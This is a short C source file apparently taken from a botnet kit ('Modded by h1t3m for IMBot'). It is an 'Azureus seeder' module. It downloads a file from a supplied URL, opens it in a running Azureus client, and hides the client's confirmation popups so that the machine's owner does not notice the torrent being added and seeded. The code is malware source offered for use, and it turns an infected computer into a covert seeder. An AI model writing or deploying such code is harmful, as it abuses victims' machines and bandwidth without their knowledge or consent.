/*
   Azureus Seeder by a59
   Modded by h1t3m for IMBot
*/
#include "include.h"

int SeedAzureus( char* szLink, char* szSaveAs )
{
   int i;
   HWND hAzureus = FindWindow( 0, "Azureus" );
   HWND hPopup, hExists;

   if( hAzureus == NULL )
      return 1;

   if( URLDownloadToFile( 0, szLink, szSaveAs, 0, 0 ) != S_OK )
      return 2;

   if( (int)ShellExecute( 0, "open", szSaveAs, 0, 0, SW_NORMAL ) <= 32 )
      return 3;

   for( i = 0; i < 10; i++ )
   {
      hExists = FindWindow( 0, "Already exists" );

      if( hExists != NULL )
      {
         ShowWindow( hExists, SW_HIDE );
         return 4;
      }

      Sleep( 100 );
   }

   for( i = 0; i < 10; i++ )
   {
      hPopup = FindWindow( 0, "Information" );

      if( hPopup != NULL )
         break;

      Sleep( 100 );
   }

   if( hPopup == NULL )
      return 5;

   ShowWindow( hPopup, SW_HIDE );

   return 0;
};

int main( )
{
   switch( SeedAzureus( torrent_link, torrent_file ) )
   {
   case 1:
      printf( "Unable to locate Azureus\n" );
      break;
   case 2:
      printf( "Unable to download file\n" );
      break;
   case 3:
      printf( "Unale to open file\n" );
      break;
   case 4:
      printf( "Already seeded!\n" );
      break;
   case 5:
      printf( "Unable to locate popup window\n" );
      break;
   case 0:
      printf( "Seeded!\n" );
      break;
   }

   return 0;
}; 